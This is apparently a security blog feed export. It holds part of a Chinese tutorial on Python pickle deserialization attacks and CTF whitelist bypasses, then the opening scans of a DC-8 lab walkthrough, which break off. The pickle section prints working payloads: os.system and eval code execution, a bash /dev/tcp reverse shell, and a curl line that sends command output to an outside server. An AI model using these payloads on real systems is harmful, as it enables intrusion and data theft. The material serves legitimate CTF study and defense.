class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))<br></code></pre></td></tr></table></figure><ul><li>例子 —— 高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块</li></ul><p>虽然只允许生成<code>__main__</code>模块的pickle，并且还禁止了<code>R</code>操作码，看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以会造成变量覆盖（跟上述变量覆盖的例子差不多）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;__main__&#x27;</span>: <span class="hljs-comment"># 只允许__main__模块</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br></code></pre></td></tr></table></figure><p>jiang jiang ~</p><p>由上述两个例子知道，对于开发者而言，使用白名单限制了能够调用的模块是规避安全问题的方法。<strong>如何绕过<code>find_class()</code>函数内的限制</strong>就是pickle反序列化解题的关键。</p><p>CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把<strong>白名单模块的文档</strong>看一看。</p><h4 id="同类型练习"><a href="#同类型练习" class="headerlink" title="同类型练习"></a>同类型练习</h4><ul><li><a href="https://xz.aliyun.com/t/5306?time__1311=n4+xnieWqR305DI5xCqiKG=KDtgj5HP5pD">Code Breaking picklecode复现</a></li></ul><p><a href="https://roboterh.github.io/2022/01/19/Code-Breaking-picklecode/">Code Breaking picklecode-带题目环境靶机</a></p><p>题目序列化漏洞的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br>__all__ = (<span class="hljs-string">&#x27;PickleSerializer&#x27;</span>, )<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PickleSerializer</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dumps</span>(<span class="hljs-params">self, obj</span>):<br>        <span class="hljs-keyword">return</span> pickle.dumps(obj)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):<br>                <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>            file = io.BytesIO(data)<br>            <span class="hljs-keyword">return</span> RestrictedUnpickler(file,<br>                              encoding=<span class="hljs-string">&#x27;ASCII&#x27;</span>, errors=<span class="hljs-string">&#x27;strict&#x27;</span>).load()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>提示：</p><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p><p>· <code>builtins</code>模块中，黑名单外的子模块。</p><p>· 已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</p><p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。</p><p>pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。</p><p>payload为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)Rp2</span><br><span class="hljs-string">00g1</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>然后构造session脚本，利用反序列化函数pickle.loads()，</p></blockquote><ul><li><a href="https://www.cnblogs.com/h3zh1/p/12698897.html">[watevrCTF-2019]Pickle Store复现</a></li></ul><p><a href="https://blog.csdn.net/weixin_45669205/article/details/116274988">[watevrCTF-2019]Pickle Store【Pickle反序列化】</a></p><blockquote><p>提示：</p><p>因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1&#x27;&quot;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>是直接取序列化后的字节串还是再经过base64加密，自己可以尝试一下。</p><h3 id="object-reduce-反序列化攻击"><a href="#object-reduce-反序列化攻击" class="headerlink" title="object.__reduce__()反序列化攻击"></a><code>object.__reduce__()</code>反序列化攻击</h3><ul><li><code>object.__reduce__（）</code>函数</li></ul><blockquote><p>· 在开发时，重写类class的<code>object.__reduce__（）</code>函数，可以使之在被实例化时按照重写的方法执行。</p><p>具体而言，python要求<code>object.__reduce__()</code>返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle反序列化时，该callable就会被调用以生成对象（该callable其实是构造函数）</p><p>· 在pickle的opcode中，<code>R</code>的作用与<code>object.__reduce__()</code>关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。</p><p>其实， <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</p></blockquote><p><code>object.__reduce__()</code>方法的指令码是<code>R</code>，主要功能是：</p><blockquote><p>· 取当前栈的栈顶记为<code>args</code>，然后把它弹掉</p><p>· 取当前栈的栈顶记为<code>f</code>，然后把它弹掉</p><p>· 以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈</p></blockquote><ul><li><p>类class的<code>__reduce__</code>方法，在<strong>pickle反序列化的时候</strong>会被执行。其底层的编程方法就是利用了<code>R</code>指令码，<code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p></li><li><p>一种流行的<strong>攻击思路</strong>是：</p></li></ul><blockquote><p>利用<code>__reduce__</code>构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p></blockquote><ul><li><code>__reduce__</code>反序列化攻击实操</li></ul><p>假设：正常的字符串被反序列化后得到了一个Person对象，那么，我们想要构造一个字符串，让它在反序列化的时候，执行<code>ls</code>指令，列出当前目录下的所有文件。</p><p>需要进行如下代码设计：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br><br>payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br>payload = pickletools.optimize(payload)<br><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反汇编结果如下：&quot;</span>)<br><span class="hljs-built_in">print</span>(pickletools.dis(payload))<br></code></pre></td></tr></table></figure><p>注意！在<code>__reduce__</code>方法内部，括号括起来的待执行命令字符串后面有一个逗号！这是不可少的。</p><p>程序的执行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914162139325.png" alt="image-20240914162139325"></p><p>payload的值为：</p><blockquote><p>b’\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x04ls &#x2F;\x85R.’</p></blockquote><p>现在将其中的<code>__reduce__</code>方法去除，然后尝试对上述payload进行反序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914163928577.png" alt="image-20240914163928577"></p><p>这里出现了一个问题，显示ls不是内部或外部命令。啧啧啧，回忆一下ls指令一般是在什么场景下用的。不一般都是在kali linux系统使用的吗？所以合理怀疑是系统指令不兼容的原因导致的报错。</p><p>windows下列出当前文件目录的指令是<code>dir</code></p><p>修改指令后再次进行尝试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;dir&#x27;</span>,))<br><br><span class="hljs-comment"># 序列化</span><br>payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br>payload = pickletools.optimize(payload)<br><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反汇编结果如下：&quot;</span>)<br><span class="hljs-built_in">print</span>(pickletools.dis(payload))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反序列化&quot;</span>)<br>res = pickle.loads(payload)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914225108471.png" alt="image-20240914225108471"></p><p>结果显示，执行反序列化操作的时候，会顺带执行<code>__reduce__</code>方法中构造的命令。</p><p>在实际的攻击中，目标类的方法可能没有定义有<code>__reduce__</code>方法，那么我们应该如何操作呢？</p><p>我们可以构造带有<code>__reduce__</code>方法（包含目标指令）的序列化格式串，然后作为输入值输入到反序列化函数中让其解析，进行执行恶意命令。</p><p>进行尝试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>res = pickle.loads(<span class="hljs-string">b&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&#x27;</span>)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p>payload的值是序列化生成的bites数据。输入payload直接进行反序列化操作，根据结果可以得知能够成功解析并执行了目标指令。</p><p>既然<code>__reduce__</code>方法在反序列化中这么不安全，那么我们可以尝试过滤掉<code>__reduce__</code>。</p><h3 id="过滤-reduce"><a href="#过滤-reduce" class="headerlink" title="过滤__reduce__"></a>过滤<code>__reduce__</code></h3><h4 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h4><ul><li>过滤<code>__reduce__</code>的方式之禁止<code>R</code>操作码</li></ul><blockquote><p>由于<code>__reduce__</code>方法对应的操作码是<code>R</code>，所以只需要把操作码<code>R</code>过滤掉即可。这个效果可以方便地利用<code>pickletools.genops</code>来实现。</p></blockquote><p>实地操作的话，大致操作如下：</p><p>需要注意的是，优化过程可能会将一些不必要的操作码过滤掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br><br>optimize_payload = pickletools.optimize(payload)<br><br>liter = pickletools.genops(payload)<br><br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> liter:<br>    opcode, arg1, arg2 = li<br>    <span class="hljs-keyword">if</span> opcode.name == <span class="hljs-string">&#x27;R&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(li)<br></code></pre></td></tr></table></figure><p><code>genops</code>返回的是一个包含多个成员的元组的迭代器。通过直接打印确认成员的数目，如下，可以确定其是包含了<code>OpcodeInfo</code>对象和两个附加值的元组。<code>OpcodeInfo</code>对象表示pickle操作码的信息，包括操作码（R、GLOBAL等）以及其它附加的参数或数据。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240915134111860.png" alt="image-20240915134111860"></p><h4 id="过滤前提下的利用"><a href="#过滤前提下的利用" class="headerlink" title="过滤前提下的利用"></a>过滤前提下的利用</h4><ul><li>过滤<code>__reduce__</code>的方式之不禁止<code>R</code>操作码，但对<code>R</code>执行的函数有黑名单限制</li></ul><p>有一些CTF题目，会给一些有关函数执行的黑名单，比如禁用open、file、os.system、eval、compile等函数。</p><p>我们要如何绕过这种名单限制成功利用这个<code>__reduce__</code>反序列化漏洞呢？</p><p>一方面，尽管有函数执行的黑名单，但是总会有漏网之鱼，但是这种一般是不常见的。</p><p>另一方面，可以利用<code>map</code>来实现。</p><blockquote><p>利用方式：<code>map</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">object</span>):<br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>,(os.system,[<span class="hljs-string">&quot;dir&quot;</span>])<br></code></pre></td></tr></table></figure></blockquote><ul><li>过滤<code>__reduce__</code>的方式之彻底过滤了<code>R</code>指令码（只要见到payload里有<code>R</code>这个字符，就直接驳回）</li></ul><blockquote><p>使用场景：给出一个字符串，反序列化之后，name和grade需要与blue module里面的name、grade相对应。</p><p>利用方式：<code>全局变量包含：妙用c指令码</code></p><p>更多操作参考下面的文章:</p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p></blockquote><h3 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h3><ul><li>其它模块的load也可以触发pickle反序列化漏洞</li></ul><p>比如, <code>numpy.load()</code>,先尝试以numpy自己的数据格式导入,如果失败,则尝试以pickle的格式导入。但<code>numpy.load()</code>是可以触发pickle反序列化漏洞的。</p><ul><li>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code></li></ul><p>所以，不能认为没有在代码里导入os库，pickle反序列化的时候就不能执行os.system了。</p><ul><li>即使没有回显，也可以方便地调试恶意代码</li></ul><p>只要拥有一台公网服务器，执行：</p><blockquote><p>os.system(‘curl your_server&#x2F;<code>ls / | base64</code>‘)</p></blockquote><p>然后查询自己的服务器日志，就能看到结果了。原因是：以” &#96; “引号包含的代码，在sh中会直接执行，返回其结果。</p><ul><li>由于pickle“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是<code>find_class</code>函数，即<code>c</code>、<code>i</code>等opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助<code>getattr</code>、<code>get</code>等函数。</li></ul><p>总而言之，对于防守方来说，若想禁用<code>__reduce__</code>这套方法，最稳妥的方法还是禁止<code>R</code>指令操作码。</p><blockquote><p>更多资料：</p><p><a href="https://blog.csdn.net/tdl320721/article/details/133827636">python实现protobuf序列化与反序列化</a></p><p><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结</a></p><p>以下是一些详细资料：</p><p><a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjecQhiWeWNHe4D">pickle反序列化初探</a></p><p><a href="https://xz.aliyun.com/t/2289">Python反序列化漏洞的花式利用</a></p><p><a href="https://zhuanlan.zhihu.com/p/25981037">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p><p><a href="https://www.anquanke.com/post/id/188981">Python pickle 反序列化实例分析</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/code-breaking_picklecode_writeup.html">从picklecode中学习python反序列化</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-8</title>
    <link href="/2024/08/12/DC-8/"/>
    <url>/2024/08/12/DC-8/</url>
    
    <content type="html"><![CDATA[<p>DC-8</p><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机，进行nmap IP扫描来确认目标靶机的IP地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723275387198.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723275468201.png" alt="img"></p><p>可以确认得到目标靶机的IP地址为：<code>192.168.204.137</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>首先进行TCP和nmap端口扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.137<br>nmap -sT -p- 192.168.204.137<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723276606859.png" alt="img"></p><p>根据扫描结果，得知，目标靶机网站开放的端口以及其对应的服务有：<code>22端口ssh远程连接服务</code>、<code>80端口http(s)服务</code>。</p><ul><li>进行端口详细扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.137<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723276816197.png" alt="img"></p><p>可以看到，22端口中有ssh相关的主机密钥，80端口显示目标靶机应该存在着一个使用apache服务器的相关网站，并且端口扫描出了与目标网站相关的文件：</p><blockquote><p>&#x2F;includes&#x2F;  &#x2F;misc&#x2F;  &#x2F;modules&#x2F;  &#x2F;profiles&#x2F;  &#x2F;scripts&#x2F;<br>&#x2F;themes&#x2F;  &#x2F;CHANGELOG.txt &#x2F;cron.php  &#x2F;INSTALL.mysql.txt<br>&#x2F;INSTALL.pgsql.txt  &#x2F;INSTALL.sqlite.txt  &#x2F;install.php  &#x2F;INSTALL.txt<br>&#x2F;LICENSE.txt  &#x2F;MAINTAINERS.txt</p></blockquote><p>一眼看下去，有个很熟悉的名词<code>misc</code>杂项，进行网页信息检索的时候可以注意一下这个文件。</p><p>然后我们还发现了目标网站使用了CMS框架 Drupal 7。之后可以尝试进行漏洞提权。</p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.137<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723379167579.png" alt="img"></p><p>似乎没有什么有用的信息。</p><h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><ul><li>在浏览器上访问目标IP地址<code>192.168.204.137</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723277492690.png" alt="img"></p><p>首先就是首页，提示我们：</p><blockquote><p>在接下来的几周，技术人员在尝试解决一些突出问题的时候，网站可能会存在一些中断。</p></blockquote><p>这给我们一些提示，有可能我们发现的可利用的问题或漏洞已经被修复了。</p><p>使用指纹工具wappalyzer识别网站的技术构成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723279712322.png" alt="img"></p><p>可以看到，目标网站使用的果然是CMS Drupal version7，技术构成相对简单。</p><p>继续浏览首页中出现的其它两个内容模块：<code>Who We Are</code>和<code>Contact Us</code></p><p>Who We Are界面显示了一大段文字介绍，看着应该不是英文。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723277880256.png" alt="img"></p><p>Contact Us界面有一个供用户进行信息提交的界面，还有提交于后台的按钮<code>Submit</code>，这里可能会成为一个注入点。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723277989885.png" alt="img"></p><p>可随便填一些数据，尝试抓包看看：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723278649149.png" alt="img"></p><p>好像没啥特别的。</p><ul><li>逐一访问端口扫描得到的目录文件</li></ul><blockquote><p>&#x2F;includes&#x2F;  &#x2F;misc&#x2F;  &#x2F;modules&#x2F;  &#x2F;profiles&#x2F;  &#x2F;scripts&#x2F;<br>&#x2F;themes&#x2F;  &#x2F;CHANGELOG.txt &#x2F;cron.php  &#x2F;INSTALL.mysql.txt<br>&#x2F;INSTALL.pgsql.txt  &#x2F;INSTALL.sqlite.txt  &#x2F;install.php  &#x2F;INSTALL.txt<br>&#x2F;LICENSE.txt  &#x2F;MAINTAINERS.txt</p></blockquote><p>访问这些文件，大多都是没有权限访问，或者是网页丢失，又或是一些没有什么敏感信息的操作说明或信息提示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723279058706.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723279158642.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723279252561.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723279341835.png" alt="img"></p><p>在&#x2F;install.php下有一些提示信息：</p><blockquote><p>若想开始必须先清空现有的数据库</p><p>要安装一个不同的数据库，需要先对网站文件夹下的<em>settings.php</em> 文件进行适当编辑</p></blockquote><p>好像现在还是没什么思路。那就先尝试进行目录爆破一下吧。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><h3 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>好慢~</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723281221868.png" 